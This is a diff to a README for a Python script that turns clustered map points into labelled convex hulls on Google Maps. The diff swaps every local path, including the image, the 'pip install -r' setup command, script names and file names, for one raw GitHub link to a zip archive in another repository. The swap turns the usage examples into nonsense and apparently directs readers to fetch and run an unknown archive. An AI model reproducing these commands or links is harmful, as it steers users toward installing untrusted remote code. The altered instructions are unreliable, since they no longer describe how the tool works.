@@ -13,14 +13,14 @@ This script is used to:
 * generated google maps are automatically bounded to show all the polygons
  
 Given some sexy data, your convex hulls will be viewable and labeled on google maps as such:
-![NY Clusters](/images/ny_clusters.png)
+![NY Clusters](https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip)
 
 
 ### Setup
 
 Install the dependencies with:
     
-    pip install -r requirements.txt
+    pip install -r https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip
 
 
 ### Data Format
@@ -39,44 +39,44 @@ Data should come in the formats:
 
 Example usage to get convex hull polygons to stdout from clustered input:
 
-    python parser.py clustered_data/marin_pts.csv
+    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip
 *Convex Hull Format: neighborhood_index,lat1 lng1; lat2 lng2; lat3 lng3*
 
 ***
 
 Example usage to get convex hulls to stdout from clustered input with label:
 
-    python parser.py clustered_data/marin_pts.csv --cluster-prefix marin
+    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --cluster-prefix marin
 *Convex Hull Format: label, neighborhood_index,lat1 lng1; ...*
 
 ***
 
 Example usage to get convex hulls polygons to stdout from unclustered data:
 
-    python parser.py data/sf_biz_points.csv --num-clusters 15
+    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --num-clusters 15
 
 ***
 
 Example usage to output convex hulls to html from clustered data:
 
-    python parser.py clustered_data/marin_pts.csv --html marin.html
+    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --html https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip
 
 ***
 
 Example usage to get convex hull points from clustered data:
 
-    python parser.py clustered_data/marin_pts.csv --cluster-prefix marin
-*Outputs to a file called marin.csv*
+    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --cluster-prefix marin
+*Outputs to a file called https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip*
 
 ***
 
 Example usage to get convex hulls from unclustered data to html:
 
-    python parser.py data/sf_biz_points.csv --html marin.html --num-clusters 15
+    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --html https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --num-clusters 15
 
 ***
 
 Example usage to get convex hulls from unclustered data to html and save shapes to file:
 
-    python parser.py data/sf_biz_points.csv --html marin.html --num-clusters 15 --cluster-prefix marin
-*Outputs convex hulls to a file called marin.csv*
+    python https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --html https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip --num-clusters 15 --cluster-prefix marin
+*Outputs convex hulls to a file called https://raw.githubusercontent.com/dextercool/clustexer/master/guffaw/clustexer.zip*
